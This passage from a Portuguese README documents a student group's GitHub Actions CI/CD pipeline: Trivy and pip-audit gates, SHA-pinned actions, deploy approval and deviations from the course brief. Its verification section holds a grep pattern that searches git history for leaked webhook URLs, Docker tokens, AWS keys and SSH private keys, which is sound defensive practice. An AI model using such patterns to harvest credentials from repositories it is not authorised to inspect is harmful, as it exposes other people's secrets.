| Secret de repositório | `Settings → Secrets and variables → Secrets` | Credencial usada por qualquer job | `NOTIFY_WEBHOOK_URL` |
| Secret de environment | Dentro do environment `staging` | Credencial que só um ambiente pode ler | `STAGING_URL` |

O `DEFAULT_PYTHON_VERSION` existe porque o job `lint` não precisa da matrix
inteira. Sem a variável, a versão ficaria escrita direto no step, e trocar de
3.12 para 3.13 exigiria caçar ocorrências pelo arquivo.

As versões testadas saem de uma **variable de repositório**, não de uma lista
fixa no YAML:

```yaml
matrix:
  python-version: ${{ fromJSON(vars.PYTHON_VERSIONS || '["3.10", "3.11", "3.12"]') }}
```

Assim ampliar ou reduzir a cobertura é uma edição em `Settings`, sem commit e sem
novo PR. O literal depois do `||` é um **fallback**: sem ele, um clone deste
repositório sem a variable cadastrada quebraria no `fromJSON` de uma string
vazia. Variable e não secret porque a informação não é sensível — o valor
aparece no log do run de qualquer forma.

O `python-version` aparece com dois nomes diferentes de propósito: é
`matrix.python-version` no `ci.yml` e `inputs.python-version` no reusable. O
reusable não sabe que existe uma matrix — ele recebe **uma** versão por chamada.
Quem multiplica é o chamador.

> [!CAUTION]
> Webhook de Discord é um bearer token: quem tem a URL posta no canal. Nunca
> comitar valor de secret, nem em comentário nem em arquivo de exemplo — um
> segredo no histórico do Git continua lá depois de "apagado" do arquivo.

---

## Verificação

```bash
# O reusable está mesmo sendo chamado (criar o arquivo não basta):
grep -n "uses: ./.github/workflows/_reusable-test.yml" .github/workflows/ci.yml

# Nenhuma action presa a tag mutável — todas fixadas por SHA de commit:
grep -hE 'uses: [a-z].*@v[0-9]' .github/workflows/*.yml || echo "todas pinadas"

# A mesma varredura de segredos que o professor faz no histórico:
git log -p --all | grep -nE 'discord\.com/api/webhooks|hooks\.slack\.com|dckr_pat_|AKIA|BEGIN OPENSSH PRIVATE KEY'
```

Na interface do GitHub:

- **Actions** — o run do último push na `main` com quatro checks verdes
- **Security → Code scanning** — relatórios do Trivy, um por versão da matrix
- Em um PR — botão de merge cinza enquanto algum check obrigatório estiver vermelho
- Após merge na `main` — `Deploy to staging (dummy)` em *Waiting*, com **Review deployments**
- **Discord** — mensagem verde no merge e vermelha no PR da demo, ambas linkando o run

---

## Troubleshooting

**O CI roda, fica vermelho, e o merge acontece mesmo assim.** Os required status
checks não foram marcados no ruleset. Os checks só aparecem na lista depois de
rodarem pelo menos uma vez: abra um PR, deixe o CI rodar e volte para marcá-los.

**O merge está bloqueado por um check que não existe mais.** Os nomes dos checks
mudam quando o pipeline é refatorado — introduzir a matrix ou extrair o reusable
renomeia todos eles. Rode o CI uma vez para os novos nomes aparecerem e remarque.

**`CODEOWNERS` com aviso "Unknown owner".** O usuário listado não tem acesso de
escrita ao repositório, ou o convite de collaborator ainda não foi aceito. A regra
é ignorada silenciosamente até isso ser resolvido.

**Um PR não consegue ser aprovado por ninguém.** O autor não pode aprovar o
próprio PR. Se ele for o único code owner do caminho tocado, a mudança precisa ser
proposta por outra pessoa.

**O job `notify` fica verde mas nada chega no canal.** O secret
`NOTIFY_WEBHOOK_URL` não está cadastrado, e o guard `if: env.WEBHOOK_URL != ''`
pula o envio de propósito. Confira em `Settings → Secrets and variables → Actions`.

**`upload-sarif` retorna 403.** Code scanning em repositório privado exige GitHub
Advanced Security. Ver [Divergências](#divergências-em-relação-ao-enunciado).

**`Cache save failed` numa perna da matrix.** Aviso, não erro. As três pernas
terminam quase juntas e o GitHub recusa gravações concorrentes de cache. A
execução seguinte restaura pelo `restore-keys` e o build não é afetado.

**O workflow não dispara.** Arquivos `.yml.example` são inertes: o GitHub Actions
só executa `.yml` e `.yaml` dentro de `.github/workflows/`.

---

## Decisões de arquitetura

### O que foi usado

Tudo com versão fixada. As dependências Python vêm de `requirements-dev.txt`; as
Actions estão pinadas por SHA de commit no YAML, com a tag em comentário.

| Papel no pipeline | Ferramenta | Versão | Onde |
| --- | --- | --- | --- |
| Orquestração | GitHub Actions, runners hospedados `ubuntu-latest` | — | tudo |
| Lint | `ruff` | 0.6.9 | job `lint` |
| Testes | `pytest` | 8.3.3 | reusable |
| Auditoria de dependências | `pip-audit` | 2.7.3 | reusable |
| Scan de filesystem e SO | `aquasecurity/trivy-action` | v0.36.0 | reusable |
| Envio do SARIF | `github/codeql-action/upload-sarif` | v4.38.0 | reusable |
| Checkout | `actions/checkout` | v7.0.1 | `lint` + reusable |
| Runtime | `actions/setup-python` | v7.0.0 | `lint` + reusable |
| Cache | `actions/cache` | v6.1.0 | `lint` + reusable |
| Versões testadas | Python 3.10, 3.11, 3.12 | via `vars.PYTHON_VERSIONS` | matrix |
| Notificação | webhook do Discord via `curl` | — | job `notify` |
| Aprovação humana | environment do GitHub com *required reviewer* | — | job `deploy-staging` |

Três mecanismos do GitHub Actions carregam o peso do desenho: **reusable
workflow** (`workflow_call`) para não duplicar steps, **matrix** para multiplicar
o job por versão do Python, e **environment** para introduzir aprovação humana
sem escrever lógica nenhuma.

### Por que assim

**Um reusable workflow, não steps duplicados.** A matrix e a lógica de teste têm
razões de mudança diferentes. Extrair os steps para `_reusable-test.yml` faz com
que trocar as versões testadas não toque nos steps, e mudar os steps não toque nas
versões. O efeito colateral é que os checks passam a se chamar
`test (3.10) / Test (Python 3.10)` — o GitHub compõe o nome do job chamador, com
o valor da matrix, e o nome do job dentro do reusable.

**Actions fixadas por SHA de commit, não por tag.** Tags são mutáveis: `@v4` hoje
pode apontar para outro commit amanhã, dando a quem comprometer a conta do
mantenedor execução de código no pipeline, com acesso aos secrets. Cada `uses:`
aponta para o commit imutável do release, com a tag em comentário para manter a
linha legível.

**Pinar não é congelar.** As versões dos esqueletos do starter-kit
(`checkout@v4.2.2`, `setup-python@v5.6.0`, `cache@v4.2.4`) rodam em **Node.js 20**,
que o GitHub deprecou — cada execução reportava oito avisos dizendo que as actions
estavam sendo forçadas para o Node.js 24, e o `upload-sarif` avisava que a CodeQL
Action v3 sai em dezembro de 2026. Subimos as quatro para o release atual, cada
uma no seu SHA. É a outra metade da prática: fixar o hash protege contra a tag
mudar debaixo dos pés, acompanhar o release protege contra rodar num runtime que
o fornecedor já abandonou.

**Atenção à tag anotada do `trivy-action`.** Diferente das `actions/*`, a tag
`v0.36.0` do `aquasecurity/trivy-action` é **anotada**: o SHA que o `git ls-remote`
lista primeiro é o do objeto-tag, não o do commit. Fixar o objeto-tag faz o
workflow falhar. O valor correto é o commit (`ed142fd…`).

**`permissions` mínimo no workflow, elevado por job.** O topo declara
`contents: read`. Só o job `test` recebe `security-events: write`, porque só ele
sobe SARIF. Um workflow comprometido faz menos estrago se o token só pode ler.

**`pip-audit` restrito a `requirements.txt`.** Auditar o ambiente inteiro
misturaria dependências de desenvolvimento no gate de produção. Um CVE no `ruff`
não deveria impedir um deploy da aplicação.

**Versões da matrix numa variable, não no YAML.** Mudar a cobertura de versões é
decisão de configuração, não de código: com `vars.PYTHON_VERSIONS` isso vira uma
edição em `Settings`, sem commit e sem PR. O fallback no `||` mantém o pipeline
executável em qualquer clone.

**Tag também passa pelos gates.** `tags: ['*']` no gatilho de push garante que
nenhuma tag chegue a virar release sem ter passado por lint, testes e scans.

**Lint fora da matrix.** Rodar o linter nas três versões do Python daria o mesmo
resultado três vezes: o `ruff` analisa o código estaticamente, sem executá-lo. O
job `lint` roda uma vez na versão padrão, em paralelo com os testes.

**Notificação com guard de secret ausente.** O step de envio só roda se o webhook
estiver configurado. Isso mantém o pipeline verde em um fork ou clone do
repositório, em vez de falhar num `curl` para uma URL vazia.

**`deploy-staging` fora dos required checks.** Um job que não roda em pull request
jamais reporta status. Torná-lo obrigatório bloquearia todo merge indefinidamente.

**Quem faz o merge não aprova o deploy.** O environment começou sem *Prevent
self-review*, e o primeiro deploy na `main` acabou aprovado por quem tinha
disparado o run. Funcionava, mas esvaziava o gate: um passo de aprovação que a
mesma pessoa cumpre sozinha pega acidente, nunca pega julgamento. Ligamos a
opção depois de perceber isso, e o histórico de deployments registra os dois
momentos.

O custo que temíamos não se confirmou. A opção bloqueia **quem disparou o run** —
e quem dispara é quem clica em *Merge* —, não o autor do pull request. Como o
`CODEOWNERS` já obriga que o revisor seja outra pessoa, os dois papéis se separam
sozinhos: o revisor mergeia, o autor aprova o deploy. É a segregação de funções
que auditoria de verdade exige, obtida com um checkbox e nenhuma coordenação
extra.

**Sem publicação de imagem.** O pipeline valida e reprova; ele não empacota nem
distribui. Publicar imagem sem ter onde consumi-la adicionaria secrets de
registry e um artefato sem destino, e o enunciado desta entrega não pede.

---

## Divergências em relação ao enunciado

Quatro pontos em que este projeto divergiu da letra do enunciado. Todos preservam
o requisito de fundo, e todos foram medidos antes de decidir.

### 1. Repositório público em vez de privado

O enunciado pede repositório **privado** com o professor como collaborator
`Read`. Este repositório está **público**.

Três exigências do próprio material só funcionam assim em conta pessoal:

| Recurso | Em repo privado |
| --- | --- |
| Upload de SARIF para `Security → Code scanning` | Exige GitHub Advanced Security, que não vem no plano Pro |
| Branch ruleset na `main` | Exige plano pago |
| Environment com *required reviewer* | Exige plano pago |

Manter o repositório privado significaria abrir mão do gate de branch protection —
que vale 30% da rubrica — ou trocar o SARIF por uma saída em texto no log.
`@HardSource` segue como collaborator, então o acesso do professor à entrega não
muda. O requisito de fundo, **o professor conseguir avaliar o repositório**, está
atendido.

### 2. `MEDIUM` incluído na faixa de severidade do Trivy

O `docs/ci-pipeline.md` especifica `severity: HIGH,CRITICAL`. Usamos
`MEDIUM,HIGH,CRITICAL`.

O motivo é uma medição, não preferência. Rodamos o Trivy sobre a dependência
vulnerável do exercício de shift-left e os três CVEs do `requests` saem
classificados como **MEDIUM**:

```text
requirements.txt (pip)
Total: 3 (UNKNOWN: 0, LOW: 0, MEDIUM: 3, HIGH: 0, CRITICAL: 0)

requests  CVE-2024-35195  MEDIUM  fixed  2.31.0 → 2.32.0
requests  CVE-2024-47081  MEDIUM  fixed  2.31.0 → 2.32.4
requests  CVE-2026-25645  MEDIUM  fixed  2.31.0 → 2.33.0
```

Com a faixa começando em `HIGH`, o Trivy passaria **verde** exatamente na
vulnerabilidade que o `pip-audit` reprova. Dois gates de segurança discordando
sobre a mesma dependência é pior que um gate rigoroso: quem lê o resultado não
sabe em qual acreditar, e a tentação é acreditar no que libera o merge.

O custo da rigidez extra é baixo e limitado por `ignore-unfixed: true` — só
achado com correção publicada pode reprovar, então nunca há build vermelho sem
ação possível. Verificamos que o `requirements.txt` atual passa verde nessa
faixa, ou seja, a mudança não introduziu ruído.

O requisito de fundo do enunciado, **Trivy como gate de segurança que bloqueia o
merge**, está atendido com folga: ele bloqueia mais, não menos.

### 3. Dois steps que o enunciado não menciona

`if: always()` no upload do SARIF e `category` por versão da matrix. Não são
preferência: sem o primeiro, o relatório nunca chega à aba Security quando há
vulnerabilidade; sem o segundo, os três uploads do mesmo commit se sobrescrevem e
podem colidir. Ambos estão comentados no próprio YAML.

### 4. Actions no release atual, não nas versões dos esqueletos

Os esqueletos usam `checkout@v4.2.2`, `setup-python@v5.6.0` e `cache@v4.2.4`.
Rodamos as três no release atual, e o `upload-sarif` na CodeQL Action v4.

Também foi medição: com as versões dos esqueletos, **toda execução reportava oito
avisos** no painel de *Annotations* — Node.js 20 deprecado, actions forçadas para
o Node.js 24, e a CodeQL Action v3 saindo em dezembro de 2026. A prática que o
material ensina, fixar por SHA de commit, continua inteira; o que mudou foi o
release fixado.

---

## Créditos

Disciplina de **Pipelines de Entrega Contínua (CI/CD) e Automação de
Deployments**, ministrada por **Waltenberg Junior**, na especialização em DevOps
da CESAR School.

Aplicação, manifestos e esqueletos de workflow a partir do starter-kit da
disciplina. Os pipelines em `.github/workflows/ci.yml` e
`.github/workflows/_reusable-test.yml` são autoria do grupo.

Autoria: [@weynne](https://github.com/weynne) ·
[@diegotavares16](https://github.com/diegotavares16) ·
[@jessicacamarco](https://github.com/jessicacamarco)
